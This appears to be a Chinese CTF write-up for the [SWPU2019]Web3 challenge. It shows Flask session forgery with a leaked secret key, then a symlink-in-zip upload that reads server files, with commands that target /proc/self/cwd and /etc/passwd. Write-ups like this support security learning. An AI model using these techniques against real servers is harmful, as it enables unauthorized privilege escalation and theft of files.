---
title: '[SWPU2019]Web3'
date: 2024-10-15 15:17:15
tags: 软连接压缩包
categories: 刷题笔记
---

### [SWPU2019]Web3

我们注册登录，发现一个上传功能

![image-20241015153111209](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151531297.png)

当我们点击时，页面提示我们权限不够

![image-20241015153135371](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151531459.png)

像这种情况一般就是伪造session

<!--more-->

我们将session解码得到

```
{'id': b'100', 'is_login': True, 'password': '1', 'username': '1'}
```

![image-20241015153231819](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151532847.png)

为了获得更高的权限我们需要将100改成1

但我们需要密钥

通过测试发现，当我们访问一个不存在的目录时

就会出现一个token

![image-20241015153431752](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151534012.png)

我们将这个进行解码，得到米亚

![image-20241015153503555](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151535607.png)

那我们开始伪造session

```
{'id': b'1', 'is_login': True, 'password': 'admin', 'username': 'admin'}
```

```
 python session_encode.py encode -s "keyqqqwwweee!@#$%^&*" -t "{'id': b'1', 'is_login': True, 'password': 'admin', 'username': 'admin'}"

```

![image-20241015154327353](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151543387.png)

我们修改session的值，得到了更高的权限

![image-20241015154353313](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151543390.png)

我们点击upload后，在页面注释中发现代码

```
@app.route('/upload',methods=['GET','POST'])
def upload():
    if session['id'] != b'1':
        return render_template_string(temp)
    if request.method=='POST':
        m = hashlib.md5()
        name = session['password']
        name = name+'qweqweqwe'
        name = name.encode(encoding='utf-8')
        m.update(name)
        md5_one= m.hexdigest()
        n = hashlib.md5()
        ip = request.remote_addr
        ip = ip.encode(encoding='utf-8')
        n.update(ip)
        md5_ip = n.hexdigest()
        f=request.files['file']
        basepath=os.path.dirname(os.path.realpath(__file__))
        path = basepath+'/upload/'+md5_ip+'/'+md5_one+'/'+session['username']+"/"
        path_base = basepath+'/upload/'+md5_ip+'/'
        filename = f.filename
        pathname = path+filename
        if "zip" != filename.split('.')[-1]:
            return 'zip only allowed'
        if not os.path.exists(path_base):
            try:
                os.makedirs(path_base)
            except Exception as e:
                return 'error'
        if not os.path.exists(path):
            try:
                os.makedirs(path)
            except Exception as e:
                return 'error'
        if not os.path.exists(pathname):
            try:
                f.save(pathname)
            except Exception as e:
                return 'error'
        try:
            cmd = "unzip -n -d "+path+" "+ pathname
            if cmd.find('|') != -1 or cmd.find(';') != -1:
				waf()
                return 'error'
            os.system(cmd)
        except Exception as e:
            return 'error'
        unzip_file = zipfile.ZipFile(pathname,'r')
        unzip_filename = unzip_file.namelist()[0]
        if session['is_login'] != True:
            return 'not login'
        try:
            if unzip_filename.find('/') != -1:
                shutil.rmtree(path_base)
                os.mkdir(path_base)
                return 'error'
            image = open(path+unzip_filename, "rb").read()
            resp = make_response(image)
            resp.headers['Content-Type'] = 'image/png'
            return resp
        except Exception as e:
            shutil.rmtree(path_base)
            os.mkdir(path_base)
            return 'error'
    return render_template('upload.html')


@app.route('/showflag')
def showflag():
    if True == False:
        image = open(os.path.join('./flag/flag.jpg'), "rb").read()
        resp = make_response(image)
        resp.headers['Content-Type'] = 'image/png'
        return resp
    else:
        return "can't give you"
```

定义两个路由,上传的那个路由就是上传一个压缩的图片,服务器进行解压再显示图片,我们这里可上传一个软连接压缩包,来读取其他文件,showflag路由告诉我们flag.jpg放在flask根目录的flag目录下

> ln是Linux的一种软连接，类似与windows的快捷方式
>
> ln -s /etc/passwd forever404 这会出现一个forever文本，里面包含密码
>
> /proc/self 记录了系统运行的信息状态等，cwd指向当前进程运行目录的一个符号链接，即flask一下进程目录



```
ln -s /proc/self/cwd/flag/flag.jpg test
zip -ry root.zip test
```

其中zip命令的参数含义如下：

```
-r：将指定的目录下的所有子目录以及文件一起处理

-y：直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。

```

![image-20241015162734926](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151627975.png)

将zip文件上传然后抓包

得到flag

![image-20241015162758812](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151627905.png)
